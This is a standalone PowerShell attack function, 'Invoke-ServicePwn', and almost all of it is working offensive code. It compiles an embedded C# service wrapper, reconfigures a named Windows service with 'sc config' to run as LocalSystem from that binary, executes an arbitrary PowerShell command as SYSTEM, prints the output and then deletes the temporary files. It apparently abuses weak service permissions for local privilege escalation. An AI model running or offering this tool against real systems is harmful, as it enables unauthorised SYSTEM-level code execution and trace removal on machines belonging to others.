function Invoke-ServicePwn {

    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Parameter(Position = 2)]
	[switch]
        $noClean,

        [Parameter(Position = 3)]
	[switch]
        $use32
    )

    $Command = $Command.Replace('"', '""');

    $csf = New-TemporaryFile;
    $outf = "$(New-TemporaryFile).exe";
    $coutf = New-TemporaryFile;
    Set-Content -Path $csf -Value @"
using System;
using System.IO;
using System.Diagnostics;
using System.ServiceProcess;
using System.Collections.Generic;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace WindowsService1
{
    public class Service1 : ServiceBase
    {

        public Service1()
        {
        }

        protected override void OnStart(string[] args)
        {
	    using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                ps.AddScript(@"$Command");
		string o = "";
                foreach (PSObject result in ps.Invoke()) {
		    o += result.ToString() + "\r\n";
                }
		File.WriteAllText(@"$coutf", o);
                rs.Close();
            }
        }

        protected override void OnStop()
        {
        }
    }
    static class Program
    {
	static void Main() {
	    ServiceBase.Run(new ServiceBase[] { new Service1() });
	}
    }
}
"@
    $liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
    if ($use32) {
        c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /r:$liba /out:$outf $csf | Out-Null;
    } else {
        c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$outf $csf | Out-Null;
    }

    #cmd /c icacls $csf /grant everyone:F | Out-Null;
    #cmd /c icacls $outf /grant everyone:F | Out-Null;
    #cmd /c icacls $coutf /grant everyone:F | Out-Null;
    Write-Host "service binary path: $outf";
    
    Set-Service -Name $Name -StartupType Manual;
    #Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\$Name" -Name ImagePath -Value "$outf";
    #Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\$Name" -Name ObjectName -Value "NT AUTHORITY\LocalSystem";
    cmd /c sc config $Name obj= "LocalSystem" binPath= "$outf" | Out-Null;
    Restart-Service -Name $Name;

    Start-Sleep -s 1;
    Write-Host "==============";
    Write-Host (Get-Content -Path $coutf);
    Write-Host "==============";

    Stop-Service -Name $Name;
    Start-Sleep -s 1;
    if ($noClean) {
	Write-Host "$csf";
	Write-Host "$outf";
	Write-Host "$coutf";
    } else {
        Remove-Item -Path "$csf" -Force -ErrorAction Ignore;
        Remove-Item -Path "$outf" -Force -ErrorAction Ignore;
        Remove-Item -Path "$coutf" -Force -ErrorAction Ignore;
    }
}
